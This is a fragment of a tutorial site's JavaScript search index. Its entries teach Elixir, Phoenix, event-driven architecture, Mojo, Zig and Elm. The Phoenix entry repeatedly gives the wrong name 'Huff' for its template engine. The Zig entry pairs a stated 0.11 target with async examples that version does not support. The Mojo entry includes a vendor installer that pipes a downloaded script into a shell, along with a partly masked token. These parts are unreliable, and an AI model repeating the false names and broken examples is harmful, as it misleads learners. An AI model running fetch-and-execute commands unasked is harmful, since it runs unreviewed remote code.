iex\u003e true == false false Arithmetic operations\nYou can also do some basic arithmetic operations\niex\u003e 2 + 2 4 iex\u003e 10 * 2 20 and the divide operator / always returns as a float:\niex\u003e 8 / 2 4.0 Modules and functions\nIn Elixir, functions are grouped into modules. An example of a module is the String module. Here’s an example:\niex\u003e String.length(\"elixir\") 6 Looking more into functions, we also have anonymos functions. They start with fn and end with end.\niex\u003e add = fn a, b -\u003e a+ b end iex\u003e add.(1,2) #and the answer should be 3 3 Note that a dot (.) between the variable and parentesis is required to invoke an anonymouse function.\nIn Elixir, functions are first class citizens meaning that they can be passed as arguments to other functions the same way integers and strings can.\niex\u003e is_function(add) true This uses the inbuilt function is_function which checks to see if the parameter passed is a function and returns a bool. Anonymous functions are closures (named functions are not) and as such they can access variables that are in scope when the function is defined. You can define a new anonymous function that uses the add anonymous function we have previously defined:\nWith modules you’re able to group several functions together. Most of the time it is convenient to write modules into files so they can be compiled and reused. Get started by creating a file named math.ex, open it in your text editor and add the following code:\ndefmodule Math do def sum(a, b) do a + b end end In order to create your own modules in Elixir, use the defmodule macro, then use the def macro to define functions in that module. So in this case the module is Math and the function is sum. Once this is saved the file can be compiled by typing elixirc into the terminal followed by the file name. $ elixirc math.ex\nThis will generate a file named Elixir.Math.beam containing the bytecode for the defined module. If we start iex again, our module definition will be available (provided that iex is started in the same directory the bytecode file is in):\niex\u003e Math.sum(1,2) 3 Creating your first Elixir project linkWe will be using mix and we’ve already discussed what mix is. Now we are going to initialise a new project by running mix new [project_name]. Let’s choose our project name to be animals, then we will have\nmix new animals after that, you can open the new animals project with your desired editor and start working.\nNow that you have learnt what elixir it, you can start experimenting and building simple, small projects that will further drill in these skills you learn and help you grasp them.\nOpen up animal.ex file in the lib directory. You should see some boilerplate code looking like this:\ndefmodule Animals do @moduledoc \"\"\" Documentation for `Animals`. \"\"\" @doc \"\"\" Hello world. ## Examples iex\u003e Animals.hello() :world \"\"\" def hello do :world end end Elixir has created a module with the name of your project along with a function that prints out a :world atom when called. It’s also added boilerplate for module and function documentation - the first part of the file. (we will go into more detail about documentation later)\nRunning the code\nLet’s test out the code by running\niex -S mix Which will start and compile your project, now run\nAnimals.hello # :world "
            }
        );
    index.add(
            {
                id:  12 ,
                href: "\/tutorials\/docs\/elixir\/elixir\/phoenix_elixix_framework\/",
                title: "A Deep Dive into Pheonix Framework",
                description: "Pheonix Lang description",
                content: "Introduction to Phoenix Framework linkOverview linkPhoenix Framework, crafted in Elixir, stands out in the realm of web development for its exceptional performance, reliability, and scalability. Rooted in the Erlang VM, Phoenix inherits characteristics ideal for building low-latency, distributed, and fault-tolerant systems. This makes it a top choice for applications demanding real-time features.\nAdvantages of Using Elixir and Erlang VM linkElixir, the language behind Phoenix, offers remarkable features like lightweight concurrency and fault tolerance, thanks to its Erlang foundation. The Erlang VM, renowned for its stability and efficiency in handling numerous simultaneous connections, is pivotal in Phoenix’s architecture. This synergy results in a framework that can effortlessly manage real-time data, a crucial aspect for modern web applications.\nPhoenix for Beginner Developers linkPhoenix’s design caters to a broad range of developers, from novices to those with intermediate skills. Its clear MVC (Model-View-Controller) structure simplifies web development, making it approachable for beginners. Meanwhile, advanced features like Channels for real-time communication and Ecto for database interactions provide a learning curve and exploration path for intermediate developers.\nCode Example: Installing Phoenix linkTo install Phoenix, you need Elixir installed on your machine. Then, you can use the following command:\nmix archive.install hex phx_new 1.5.9 This command installs the Phoenix archive, allowing you to create new Phoenix projects.\nGetting Started with Phoenix Framework linkCreating a New Phoenix Project linkInitiating a new Phoenix project is simple. Open your terminal and run:\nmix phx.new my_app Replace my_app with your desired project name. This command scaffolds a new Phoenix application with all necessary files and directories.\nUnderstanding the Directory Structure linkA Phoenix project comprises several directories, each with a specific purpose:\nlib/: Contains Elixir code, including your application logic and routing. assets/: Houses JavaScript, CSS, and static assets. priv/: For private data like database migrations. config/: Configuration files for different environments. test/: Test files for your application. Code Example: Creating a Phoenix Project linkThis example demonstrates creating a basic Phoenix project:\n# Create a new Phoenix project mix phx.new my_app # Navigate into the project directory cd my_app # Install dependencies mix deps.get This sequence of commands creates a new Phoenix project named my_app and sets up its dependencies.\nBasic Concepts of Phoenix Framework linkUnderstanding MVC Architecture in Phoenix linkMVC in Phoenix is about separating concerns:\nModel: Represents data and business logic. In Phoenix, models are handled by Ecto, a database wrapper and query generator. View: Responsible for rendering the user interface, typically with HTML and Huff templates. Controller: Acts as an intermediary between models and views, processing incoming requests and delivering responses. Routing Basics linkRouting in Phoenix directs incoming web requests to the appropriate controller and action. Routes are defined in router.ex, located in the lib/my_app_web directory. Example:\nscope \"/\", MyAppWeb do pipe_through :browser get \"/\", PageController, :index end This route directs requests to the root URL (\"/\") to the PageController’s index action.\nControllers and Views linkControllers in Phoenix handle the business logic of your application. A controller might fetch data from a model and pass it to a view for rendering. Example:\ndefmodule MyAppWeb.PageController do use MyAppWeb, :controller def index(conn, _params) do render(conn, \"index.html\") end end Views in Phoenix are modules that render templates. They define functions to transform data for presentation. Example:\ndefmodule MyAppWeb.PageView do use MyAppWeb, :view end Code Example: A Simple Controller and View linkThis example illustrates a basic controller and view setup:\n# Controller defmodule MyAppWeb.HelloController do use MyAppWeb, :controller def greet(conn, _params) do render(conn, \"greet.html\", name: \"Phoenix\") end end # View defmodule MyAppWeb.HelloView do use MyAppWeb, :view end In the router.ex:\nget \"/greet\", HelloController, :greet And a corresponding Huff template greet.html.eex:\n\u003c!DOCTYPE html\u003e Greeting Hello \u003c%= @name %\u003e! This setup creates a page that greets with “Hello Phoenix!”.\nIntroduction to Elixir’s HTML Safe Template Engine linkHuff is an integral part of the Phoenix Framework, serving as its HTML-safe template engine. It’s designed to facilitate the dynamic rendering of HTML within Phoenix applications, offering a blend of simplicity and power.\nWhat is Huff? linkHuff is a template engine used in Phoenix for rendering HTML. It allows developers to embed Elixir code within templates, which are then rendered into HTML. This makes creating dynamic, data-driven web pages straightforward.\nWhy Use Huff in Phoenix Framework linkHuff’s integration with Phoenix provides several benefits:\nSecurity: Automatically escapes HTML, preventing injection attacks. Performance: Optimized for speed, enhancing the performance of web applications. Convenience: Seamlessly integrates with Phoenix’s MVC architecture, allowing for easy data passing from controllers to views. Basic Huff Syntax and Examples linkHuff syntax is a mix of HTML and embedded Elixir expressions, marked by \u003c% %\u003e.\nExample:\n\u003c%= for user \u003c- @users do %\u003e \u003c%= user.name %\u003e \u003c% end %\u003e This template iterates over a list of users, injecting each user’s name into an HTML list item.\nCode Example: Using Huff in a Phoenix View linkLet’s consider a Phoenix view rendering user data using Huff:\n# Controller defmodule MyAppWeb.UserController do use MyAppWeb, :controller def list(conn, _params) do users = MyApp.get_users() # Assume this retrieves a list of users render(conn, \"list.html\", users: users) end end The corresponding Huff template list.html.eex might look like this:\n\u003c!DOCTYPE html\u003e Users Users List \u003c%= for user \u003c- @users do %\u003e \u003c%= user.name %\u003e \u003c% end %\u003e This controller-view setup displays a list of users on a web page, dynamically rendered through Huff.\nWorking with Databases and Ecto linkOverview of Ecto linkEcto is not just a database wrapper; it’s a comprehensive toolkit for dealing with databases in Elixir. It includes:\nEcto.Schema: For defining mappings between Elixir structs and database tables. **Ecto.Repo Creating and Managing Schemas Schemas in Ecto are used to map Elixir structs to database tables.\nExample:\nDefining a simple schema for a User model: defmodule MyApp.User do use Ecto.Schema schema \"users\" do field :name, :string field :email, :string end end This code maps the User struct to a table called “users” with name and email fields.\nBasic Database Operations\nWith Ecto, you can perform a variety of database operations, such as insert, update, delete, and query.\nInsert Example: Creating a new user:\n%MyApp.User{name: \"Alice\", email: \"alice@example.com\"} |\u003e MyApp.Repo.insert() This code creates a new user with name “Alice” and email “alice@example.com” and inserts it into the database.\nQuery Example: Fetching users:\nusers = MyApp.Repo.all(MyApp.User) This query retrieves all records from the “users” table.\nCode Example: Integrating Ecto in a Phoenix Project\nLet’s see a more integrated example of using Ecto in a Phoenix project:\nDefining a Schema:\n# lib/my_app/user.ex defmodule MyApp.User do use Ecto.Schema schema \"users\" do field :name, :string field :email, :string end end Creating and Running Migrations: Phoenix uses migrations to modify the database schema. To create a migration for the users table:\nmix ecto.gen.migration create_users This generates a new migration file in the priv/repo/migrations directory.\nImplementing CRUD Operations: In a controller, you can implement CRUD operations:\n# lib/my_app_web/controllers/user_controller.ex defmodule MyAppWeb.UserController do use MyAppWeb, :controller def create(conn, %{\"user\" =\u003e user_params}) do case MyApp.Users.create_user(user_params) do {:ok, user} -\u003e # handle successful creation {:error, changeset} -\u003e # handle error end end end This example demonstrates creating a new user with error handling.\nAdvanced Features in Phoenix Framework** linkPhoenix Framework excels in providing advanced features that cater to modern web application development needs. This section covers Channels, custom plugs, and testing strategies.\nChannels and Real-Time Communication\nChannels in Phoenix are a powerful feature for real-time communication, often used for features like chat applications or live updates.\nExample: Creating a Channel: To create a channel, you define a channel module and route incoming socket connections:\n# Define the channel defmodule MyAppWeb.MyChannel do use Phoenix.Channel def join(\"room:lobby\", _message, socket) do {:ok, socket} end end Routing socket connections in router.ex:\nsocket \"/socket\", MyAppWeb.UserSocket, websocket: true This code sets up a basic channel allowing connections to “room:lobby”.\nCustom Plugs\nPlugs are a cornerstone of Phoenix, allowing for modular and reusable components in the request-response lifecycle.\nExample: Creating a Custom Plug: A custom plug can be used to authenticate users:\ndefmodule MyAppWeb.AuthenticatePlug do import Plug.Conn def init(options), do: options def call(conn, _options) do # Authentication logic conn end end This plug could be added to a pipeline in your Phoenix router to authenticate requests.\nTesting in Phoenix\nPhoenix provides robust tools for testing your application, ensuring reliability and functionality.\nExample: Controller Test: Testing a Phoenix controller might involve checking the response to a specific request:\ndefmodule MyAppWeb.PageControllerTest do use MyAppWeb.ConnCase test \"GET /\", %{conn: conn} do conn = get(conn, \"/\") assert html_response(conn, 200) =~ \"Welcome to Phoenix!\" end end This test checks that a request to the root path returns a 200 status code and contains the expected content.\nCode Example: Implementing a Channel for Real-Time Updates\nLet’s look at a practical example of using a channel for real-time updates in a Phoenix application:\nChannel Setup:\n# Define the channel in my_channel.ex defmodule MyAppWeb.MyChannel do use Phoenix.Channel def join(\"updates:all\", _message, socket) do {:ok, socket} end end Client-Side Implementation: In the client-side JavaScript, you would open a socket connection and join the channel:\nlet socket = new Phoenix.Socket(\"/socket\") socket.connect() let channel = socket.channel(\"updates:all\", {}) channel.join() .receive(\"ok\", resp =\u003e { console.log(\"Joined successfully\", resp) }) .receive(\"error\", resp =\u003e { console.log(\"Unable to join\", resp) }) This JavaScript code connects to the “updates:all” channel and logs the status of the connection.\n"
            }
        );
    index.add(
            {
                id:  13 ,
                href: "\/tutorials\/docs\/technical-architecture\/technical-architecture\/event_driven_architecture\/",
                title: "A Detailed Guide to Event-Driven Architecture",
                description: "Event-Driven Architecture (EDA) has emerged as a powerful paradigm for building scalable, resilient, and responsive systems. This guide provides an in-depth look at EDA, its core concepts, benefits, and challenges, and offers practical advice for implementing it in your projects.\nWhat is Event-Driven Architecture? linkEvent-Driven Architecture (EDA) is a design paradigm in which the flow of the program is determined by events such as user actions, sensor outputs, or messages from other programs.",
                content: "Event-Driven Architecture (EDA) has emerged as a powerful paradigm for building scalable, resilient, and responsive systems. This guide provides an in-depth look at EDA, its core concepts, benefits, and challenges, and offers practical advice for implementing it in your projects.\nWhat is Event-Driven Architecture? linkEvent-Driven Architecture (EDA) is a design paradigm in which the flow of the program is determined by events such as user actions, sensor outputs, or messages from other programs. An event can be defined as any significant change in state. EDA decouples event producers from event consumers, which allows for more flexible and scalable system designs.\nCore Components of EDA link Events: Signals that a significant action or change has occurred. Event Producers: Components that generate events. Event Consumers: Components that react to events. Event Channel: The medium through which events are transmitted from producers to consumers. Event Broker: A system component that routes events from producers to the appropriate consumers. Event Types link Simple Events: Indicate a change in state without additional context. Complex Events: Combine multiple events or add context to provide more comprehensive information. Benefits of Event-Driven Architecture link1. Scalability linkEDA supports horizontal scaling by decoupling services, allowing each component to scale independently based on demand. This is especially beneficial in systems with varying load patterns.\n2. Resilience linkDecoupling services reduces the risk of a single point of failure. If one component fails, others can continue to operate, enhancing the overall system resilience.\n3. Responsiveness linkEDA enables real-time processing and immediate reactions to events, making systems more responsive to user actions and external triggers.\n4. Flexibility linkComponents in an event-driven system can be developed, deployed, and maintained independently. This flexibility supports continuous integration and continuous deployment (CI/CD) practices.\n5. Easier Integration linkEDA facilitates the integration of heterogeneous systems and technologies, allowing for easier expansion and modification of the system.\nChallenges of Event-Driven Architecture link1. Complexity linkDesigning and managing an event-driven system can be complex. Developers need to handle event routing, ordering, and potential event loss.\n2. Debugging and Monitoring linkDebugging event-driven systems is more challenging compared to traditional architectures due to the asynchronous nature of events. Monitoring tools are essential for tracking event flows and diagnosing issues.\n3. Consistency linkMaintaining data consistency across distributed components can be difficult. Developers must implement strategies for eventual consistency and handle conflicts gracefully.\n4. Latency linkThe time taken for an event to travel from the producer to the consumer can introduce latency. Optimizing event routing and processing is critical to minimize delays.\nKey Concepts in Event-Driven Architecture link1. Event Streaming linkEvent streaming involves continuously capturing and storing events as they occur, enabling real-time data processing and analytics. Technologies like Apache Kafka and Amazon Kinesis are popular choices for event streaming.\n2. Event Sourcing linkEvent sourcing is a design pattern where state changes are logged as a series of events. This approach provides a complete audit trail and allows for the reconstruction of past states by replaying events.\n3. Command Query Responsibility Segregation (CQRS) linkCQRS separates the read and write operations of a system. Commands change the state and are handled asynchronously, while queries read the state. This separation optimizes performance and scalability.\n4. Publish-Subscribe Pattern linkIn a publish-subscribe (pub/sub) model, event producers (publishers) send events to an intermediary (event broker), which then routes the events to the appropriate consumers (subscribers). This pattern decouples producers and consumers, enhancing scalability and flexibility.\nImplementing Event-Driven Architecture linkStep 1: Define Events linkIdentify the key events that your system needs to respond to. Clearly define the structure and payload of each event.\nStep 2: Choose an Event Broker linkSelect an event broker that suits your system’s needs. Popular choices include:\nApache Kafka: Ideal for high-throughput and low-latency event streaming. RabbitMQ: Suitable for reliable message queuing and routing. Amazon SNS/SQS: Managed services that simplify event-driven architectures in the cloud. Step 3: Design Event Producers and Consumers linkDevelop components that generate and handle events. Ensure that each component is loosely coupled and can operate independently.\nStep 4: Implement Event Channels linkEstablish reliable channels for transmitting events. Ensure that the channels can handle the expected load and provide necessary guarantees (e.g., at-least-once delivery).\nStep 5: Handle Event Processing linkDesign your event consumers to process events efficiently. Consider using frameworks like Apache Flink or AWS Lambda for real-time event processing.\nStep 6: Ensure Data Consistency linkImplement strategies for maintaining data consistency. This may involve using distributed transactions, eventual consistency models, or compensating actions.\nStep 7: Monitor and Debug linkDeploy monitoring and logging tools to track event flows and diagnose issues. Tools like ELK Stack (Elasticsearch, Logstash, Kibana), Prometheus, and Grafana can provide valuable insights.\nStep 8: Test Thoroughly linkPerform extensive testing to ensure that your event-driven system behaves as expected. Simulate different load patterns and failure scenarios to identify potential issues.\nUse Cases and Examples linkReal-Time Analytics linkEDA is well-suited for real-time analytics applications, such as monitoring social media feeds, tracking user behavior on websites, and analyzing sensor data from IoT devices.\nE-commerce Systems linkIn e-commerce, EDA can handle events like order placements, inventory updates, and payment processing. This enables real-time updates and improves the responsiveness of the system.\nMicroservices Architectures linkEDA complements microservices by providing a robust mechanism for inter-service communication. Each microservice can publish and subscribe to events, facilitating a decoupled and scalable architecture.\nFinancial Services linkFinancial institutions use EDA for real-time fraud detection, transaction processing, and market data analysis. Events are processed in real-time to identify and respond to suspicious activities.\nConclusion linkEvent-Driven Architecture offers a powerful approach to building scalable, resilient, and responsive systems. By decoupling components and leveraging real-time event processing, EDA enables organizations to build flexible and adaptable software solutions. While implementing EDA comes with its own set of challenges, careful planning, and the right tools can help you harness its full potential. Whether you are building a real-time analytics platform, an e-commerce system, or a microservices-based application, EDA provides the foundation for creating robust and scalable architectures.\n"
            }
        );
    index.add(
            {
                id:  14 ,
                href: "\/tutorials\/docs\/mojo\/mojo\/introduction_to_mojo\/",
                title: "A Getting Started Guide to Mojo",
                description: "Mojo Lang description",
                content: "Background link Common Perception: Python is often labeled as a slow and merely a scripting language. Frustration with Misconception: The belief that Python’s performance issues stem from the language itself, rather than how the code is written. Choosing Mojo: The Main Reason link Modular | Mojo as a Bridge: Mojo combines Python’s ease of use with advanced programming capabilities. It’s tailored for both research and production environments. Systems Programming Language: Designed for heterogeneous computing, Mojo excels in handling different processors like CPUs, GPUs, FPGAs, and NPUs. Versatility and Control: As an AI Application Research Engineer, the author values complete control over the entire process - from research to deployment, without needing extensive hardware knowledge or multiple tools. Key Takeaway link Mojo is not just about enhancing speed; it’s about offering a comprehensive solution that balances ease of use with sophisticated programming capabilities for diverse computing environments. Getting Started linkInitial Setup link Download Mojo SDK: Essential for running Mojo code. Includes the “Mojo CLI” (Command Line Interface), a versatile tool for executing Mojo code and other tasks. Provides a REPL (Read-Eval-Print Loop) environment for interactive coding. Learning and Development Environment link Using REPL: Ideal for beginners, similar to a basic calculator, great for practicing small code snippets. Advancing with Mojo: Organize code into Mojo files, modules, and packages. Use Visual Studio Code (VSCode) for a more structured coding environment. Leverage a Mojo extension for VSCode offering features like auto-completion and quick fixes. Installation on Different Operating Systems link Compatibility: Currently, Mojo SDK is only compatible with Ubuntu \u0026 MacOS. Windows users can utilize WSL (Windows Subsystem for Linux) container. Installation Steps: For Linux or MacOS: curl https://get.modular.com | MODULAR_AUTH=mut_e982ece66e6949d593f64xxxx sh - modular install mojo Setting Environment Variables: Add MODULAR_HOME and PATH to .bashrc or .zsh files as suggested during installation. Updating Mojo SDK link Run the following commands: sudo apt-get update sudo apt-get install modular modular clean modular install mojo Visual Studio Code Extension link Download the VSCode extension for an enhanced Mojo coding experience. Mojo Playground link Access the Mojo environment in a browser via the Mojo playground link. Running Mojo Code linkUsing REPL link Start REPL by typing mojo. Example: mojo # Type your code here Mojo Source File link Create a file (e.g., hello.mojo) and write your Mojo code. Example: fn main(): print(\"Hello, world!\") Executing Code link Run a Mojo file: mojo hello.mojo Build an executable: mojo build hello.mojo Run the executable: ./hello Mojo CLI Usage link Basic Commands: Check version: mojo --version or mojo -v Get help: mojo --help or mojo -h Run a file: mojo run ./hello.mojo Build a file: mojo build ./hello.mojo Launch REPL: mojo repl Other commands include debug, package, format, doc, and demangle. "
            }
        );
    index.add(
            {
                id:  15 ,
                href: "\/tutorials\/docs\/zig\/zig\/zig\/",
                title: "A getting started guide to Zig",
                description: "Zig is a general-purpose programming language and toolchain for maintaining robust, optimal, and reusable software.",
                content: "Key Features of Zig: link Safety and Performance: Zig ensures memory safety and offers performance comparable to languages like C. Simplicity and Maintainability: Zig’s focus on avoiding hidden control flow and minimizing dependencies. Comptime: Fast compile-time execution and it sets Zig apart from other languages. Installation linkThis guide assumes Zig 0.11, which is the latest major release as of writing.\nDownload and extract a prebuilt master binary of Zig from: https://ziglang.org/download/\nAdd Zig to your path\nlinux, macos, bsd Add the location of your Zig binary to your PATH environment variable. For an installation, add export PATH=$PATH:~/zig or similar to your /etc/profile (system-wide) or $HOME/.profile. If these changes do not apply immediately, run the line from your shell.\nwindows a) System wide (admin powershell)\n[Environment]::SetEnvironmentVariable( \"Path\", [Environment]::GetEnvironmentVariable(\"Path\", \"Machine\") + \";C:\\your-path\\zig-windows-x86_64-your-version\", \"Machine\" ) b) User level (powershell)\n[Environment]::SetEnvironmentVariable( \"Path\", [Environment]::GetEnvironmentVariable(\"Path\", \"User\") + \";C:\\your-path\\zig-windows-x86_64-your-version\", \"User\" ) Close your terminal and create a new one.\nVerify your installation with zig version. The output should look like this:\n$ zig version 0.11 Hello World linkCreate a file called main.zig, with the following contents:\nconst std = @import(\"std\"); pub fn main() void { std.debug.print(\"Hello, {s}!\\n\", .{\"World\"}); } Use zig run main.zig to build and run it. In this example, Hello, World! will be written to stderr, and is assumed to never fail.\nAssignment linkValue assignment has the following syntax: (const|var) identifier[: type] = value.\nconst indicates that identifier is a constant that stores an immutable value. var indicates that identifier is a variable that stores a mutable value. : type is a type annotation for identifier, and may be omitted if the data type of value can be inferred. const constant: i32 = 5; // signed 32-bit constant var variable: u32 = 5000; // unsigned 32-bit variable const inferred_constant = @as(i32, 5); var inferred_variable = @as(u32, 5000); Constants and variables must have a value. If no known value can be given, the undefined value, which coerces to any type, may be used as long as a type annotation is provided.\nconst a: i32 = undefined; var b: u32 = undefined; Where possible, const values are preferred over var values.\nArrays linkArrays are denoted by [N]T, where N is the number of elements in the array and T is the type of those elements (i.e., the array’s child type). For array literals, N may be replaced by _ to infer the size of the array.\nconst a = [5]u8{ 'h', 'e', 'l', 'l', 'o' }; const b = [_]u8{ 'w', 'o', 'r', 'l', 'd' }; To get the size of an array, simply access the array’s len field.\nconst array = [_]u8{ 'h', 'e', 'l', 'l', 'o' }; const length = array.len; // 5 If linkZig’s if statements only accept bool values (i.e. true or false). There is no concept of truthy or falsy values. Here, we will introduce testing. Save the below code and compile + run it with zig test file-name.zig. We will be using the expect function from the standard library, which will cause the test to fail if it’s given the value false. When a test fails, the error and stack trace will be shown.\nconst expect = @import(\"std\").testing.expect; test \"if statement\" { const a = true; var x: u16 = 0; if (a) { x += 1; } else { x += 2; } try expect(x == 1); } // If statements also work as expressions. test \"if statement expression\" { const a = true; var x: u16 = 0; x += if (a) 1 else 2; try expect(x == 1); } While linkZig’s while loop has three parts - a condition, a block, and a continue expression. Without a continue expression.\ntest \"while\" { var i: u8 = 2; while (i \u003c 100) { i *= 2; } try expect(i == 128); } With a continue expression.\ntest \"while with continue expression\" { var sum: u8 = 0; var i: u8 = 1; while (i \u003c= 10) : (i += 1) { sum += i; } try expect(sum == 55); } With a continue.\ntest \"while with continue\" { var sum: u8 = 0; var i: u8 = 0; while (i \u003c= 3) : (i += 1) { if (i == 2) continue; sum += i; } try expect(sum == 4); } With a break.\ntest \"while with break\" { var sum: u8 = 0; var i: u8 = 0; while (i \u003c= 3) : (i += 1) { if (i == 2) break; sum += i; } try expect(sum == 1); } For linkFor loops are used to iterate over arrays. For loops follow this syntax. Like while, for loops can use break and continue. Here, we’ve had to assign values to _, as Zig does not allow us to have unused values.\ntest \"for\" { //character literals are equivalent to integer literals const string = [_]u8{ 'a', 'b', 'c' }; for (string, 0..) |character, index| { _ = character; _ = index; } for (string) |character| { _ = character; } for (string, 0..) |_, index| { _ = index; } for (string) |_| {} } Functions linkAll function arguments are immutable - if a copy is desired the user must explicitly make one. Unlike variables, which are snake_case, functions are camelCase. Here’s an example of declaring and calling a simple function.\nfn addFive(x: u32) u32 { return x + 5; } test \"function\" { const y = addFive(0); try expect(@TypeOf(y) == u32); try expect(y == 5); } Recursion is allowed:\nfn fibonacci(n: u16) u16 { if (n == 0 or n == 1) return n; return fibonacci(n - 1) + fibonacci(n - 2); } test \"function recursion\" { const x = fibonacci(10); try expect(x == 55); } Values Ignoring linkValues can be ignored using _ instead of a variable or const declaration. This does not work at the global scope (i.e., it only works inside functions and blocks) and is useful for ignoring the values returned from functions if you do not need them.\n_ = 10; Defer linkDefer is used to execute a statement while exiting the current block.\ntest \"defer\" { var x: i16 = 5; { defer x += 2; try expect(x == 5); } try expect(x == 7); } When there are multiple defers in a single block, they are executed in reverse order.\ntest \"multi defer\" { var x: f32 = 5; { defer x += 2; defer x /= 2; } try expect(x == 4.5); } Errors linkAn error set is like an enum, where each error in the set is a value. There are no exceptions in Zig; errors are values.\nconst FileOpenError = error{ AccessDenied, OutOfMemory, FileNotFound, }; Switch linkZig’s switch works as both a statement and an expression. The types of all branches must coerce to the type which is being switched upon. All possible values must have an associated branch - values cannot be left out. Cases cannot fall through to other branches.\ntest \"switch statement\" { var x: i8 = 10; switch (x) { -1...1 =\u003e { x = -x; }, 10, 100 =\u003e { //special considerations must be made //when dividing signed integers x = @divExact(x, 10); }, else =\u003e {}, } try expect(x == 1); } Here is the former, but as a switch expression.\ntest \"switch expression\" { var x: i8 = 10; x = switch (x) { -1...1 =\u003e -x, 10, 100 =\u003e @divExact(x, 10), else =\u003e x, }; try expect(x == 1); } Slices linkSlices can be thought of as a pair of [*]T (the pointer to the data) and a usize (the element count). Their syntax is []T, with T being the child type.\nfn total(values: []const u8) usize { var sum: usize = 0; for (values) |v| sum += v; return sum; } test \"slices\" { const array = [_]u8{ 1, 2, 3, 4, 5 }; const slice = array[0..3]; try expect(total(slice) == 6); } Enums linkZig’s enums allow you to define types with a restricted set of named values.\nconst Direction = enum { north, south, east, west }; Structs linkStructs are Zig’s most common kind of composite data type, allowing you to define types that can store a fixed set of named fields.\nconst Vec3 = struct { x: f32, y: f32, z: f32 }; test \"struct usage\" { const my_vector = Vec3{ .x = 0, .y = 100, .z = 50, }; _ = my_vector; } ArrayList linkThe std.ArrayList is commonly used throughout Zig, serving as a buffer that can change in size. std.ArrayList(T) is similar to C++’s std::vector and Rust’s Vec.\nconst eql = std.mem.eql; const ArrayList = std.ArrayList; const test_allocator = std.testing.allocator; test \"arraylist\" { var list = ArrayList(u8).init(test_allocator); defer list.deinit(); try list.append('H'); try list.append('e'); try list.append('l'); try list.append('l'); try list.append('o'); try list.appendSlice(\" World!\"); try expect(eql(u8, list.items, \"Hello World!\")); } Filesystem linkCreating, opening, writing to, and reading from a file in the current working directory.\ntest \"createFile, write, seekTo, read\" { const file = try std.fs.cwd().createFile( \"junk_file.txt\", .{ .read = true }, ); defer file.close(); const bytes_written = try file.writeAll(\"Hello File!\"); _ = bytes_written; var buffer: [100]u8 = undefined; try file.seekTo(0); const bytes_read = try file.readAll(\u0026buffer); try expect(eql(u8, buffer[0..bytes_read], \"Hello File!\")); } Threads linkUsing std.Thread for utilizing OS threads.\nfn ticker(step: u8) void { while (true) { std.time.sleep(1 * std.time.ns_per_s); tick += @as(isize, step); } } var tick: isize = 0; test \"threading\" { var thread = try std.Thread.spawn(.{}, ticker, .{@as(u8, 1)}); _ = thread; try expect(tick == 0); std.time.sleep(3 * std.time.ns_per_s / 2); try expect(tick == 1); } Sorting linkThe standard library provides utilities for in-place sorting slices.\ntest \"sorting\" { var data = [_]u8{ 10, 240, 0, 0, 10, 5 }; std.mem.sort(u8, \u0026data, {}, comptime std.sort.asc(u8)); try expect(eql(u8, \u0026data, \u0026[_]u8{ 0, 0, 5, 10, 10, 240 })); std.mem.sort(u8, \u0026data, {}, comptime std.sort.desc(u8)); try expect(eql(u8, \u0026data, \u0026[_]u8{ 240, 10, 10, 5, 0, 0 })); } Async linkZig’s async functions allow for asynchronous execution without the need for OS threads.\nconst expect = @import(\"std\").testing.expect; var foo: i32 = 1; test \"suspend with no resume\" { var frame = async func(); //1 _ = frame; try expect(foo == 2); //4 } fn func() void { foo += 1; //2 suspend {} //3 foo += 1; //never reached! } var bar: i32 = 1; test \"suspend with resume\" { var frame = async func2(); //1 resume frame; //4 try expect(bar == 3); //6 } fn func2() void { bar += 1; //2 suspend {} //3 bar += 1; //5 } Async / Await linkAsync functions in Zig can be invoked with the await keyword to wait for their completion and retrieve their return value asynchronously.\nfn func3() u32 { return 5; } test \"async / await\" { var frame = async func3(); try expect(await frame == 5); } Using await on an async function from another async function allows for chaining asynchronous operations.\nfn asyncOperation() u32 { return 10; } fn asyncOperation2(value: u32) u32 { return value * 2; } test \"chaining async operations\" { var frame = async asyncOperation(); var result = await asyncOperation2(await frame); try expect(result == 20); } "
            }
        );
    index.add(
            {
                id:  16 ,
                href: "\/tutorials\/docs\/elm\/elm\/getting_started_with_elm\/",
                title: "A Getting Started Guide With Elm",
                description: "Get started and learn the introduction of elm",
                content: "Introduction to Elm linkElm is a delightful language for reliable web applications. It compiles to JavaScript, but it’s much more than just a language; it’s a framework for making web development more robust and pleasant. One of the most striking features of Elm is its emphasis on simplicity and quality tooling, making it an excellent choice for both beginners and experienced developers.\nWhy Elm? linkSimplicity and Safety\nElm’s syntax is clean and easy to understand, making it an ideal starting point for those new to programming. It avoids runtime errors in your application, thanks to its strong type system and compiler checks. This means fewer crashes and unexpected behavior in your applications.\nPerformance and Maintainability Elm applications are known for their performance. The language is designed for easy refactoring and maintainability, so your codebase remains manageable, even as it grows in complexity. Great Developer Experience\nElm provides a friendly compiler that not only catches errors but also suggests how to fix them. This feature, along with a strong set of tools and a helpful community, makes learning and developing with Elm a rewarding experience. In the following sections, we will delve into Elm’s setup, basic syntax, core concepts, and some advanced features, all accompanied by practical code examples. This journey will equip you with the foundational knowledge and skills to start building your own Elm applications.\nGetting Started with Elm linkElm provides a smooth entry point for beginners, and setting it up is straightforward. Here’s how you can get started with Elm and write your first Elm program.\nInstallation and Setup\nInstall Elm: Visit Elm’s official website and follow the instructions to install Elm for your operating system.2. Editor Setup: For a better experience, use an editor with Elm support, like Visual Studio Code. Install the Elm language support extensions for syntax highlighting and auto-completion. Create Your First Elm File: Create a new file with the extension .elm. For instance, HelloWorld.elm. Basic Syntax and Structure linkElm is a purely functional language, and its syntax reflects this. Here’s a quick overview: ● Comments: Single-line comments start with –, and multi-line comments are enclosed in {- and -}. ● Functions: Functions are central in Elm. A simple function to add two numbers looks like this:\nadd a b = a + b ● ● Variables: Elm uses immutable variables. Once a variable is declared, its value can’t change. Types: Types are explicit in Elm, ensuring code reliability.\n“Hello, World!” in Elm linkLet’s write the classic “Hello, World!” program. Create a file named HelloWorld.elm and write the following code:\nmodule HelloWorld exposing (..) import Html exposing (text) main = text \"Hello, World!\" This program uses the Html module to display text. The main function is the entry point of every Elm program. Here, it’s using text from the Html module to render “Hello, World!” on the screen. To run this program: ​ Open your terminal or command prompt. ​ Navigate to the directory containing your HelloWorld.elm file. ​ Run elm reactor. ​ Open your web browser and go to http://localhost:8000. ​ Click on HelloWorld.elm to see your program running.\nExample Code using elm linkEach section of the code is explained through the comments\n-- This is a single line comment. {- This is a multi-line comment. It is {- nestable. -} -} -- Here we define a value named `greeting`. The type is inferred as a `String`. greeting = \"Hello World!\" -- It is best to add type annotations to top-level declarations. hello : String hello = \"Hi there.\" -- Functions are declared the same way, 